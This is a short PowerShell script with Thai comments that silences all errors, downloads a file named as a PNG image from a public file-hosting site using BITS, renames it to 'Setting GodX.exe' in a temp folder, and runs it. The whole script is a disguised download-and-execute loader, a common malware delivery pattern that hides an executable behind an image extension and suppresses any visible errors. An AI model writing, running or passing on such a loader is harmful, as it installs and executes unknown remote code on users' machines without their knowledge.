# ปิดการแสดงข้อความให้ทำงานแบบเงียบสนิท
$ErrorActionPreference = 'SilentlyContinue'

$exeName = "Setting GodX.exe"
$url = "https://files.catbox.moe/c7lpiz.png"
$tempPath = "$env:TEMP\GodX_App"
$exePath = "$tempPath\$exeName"

# สร้างโฟลเดอร์ทำงาน
if (!(Test-Path $tempPath)) { New-Item -ItemType Directory -Path $tempPath | Out-Null }

# ใช้ BITS ดาวน์โหลด (เร็วที่สุดใน Windows)
$job = Start-BitsTransfer -Source $url -Destination "$tempPath\temp.png" -TransferType Download -ErrorAction SilentlyContinue
Rename-Item -Path "$tempPath\temp.png" -NewName $exeName -Force

# รันโปรแกรมแบบ Working Directory
Start-Process "$exePath" -WorkingDirectory $tempPath
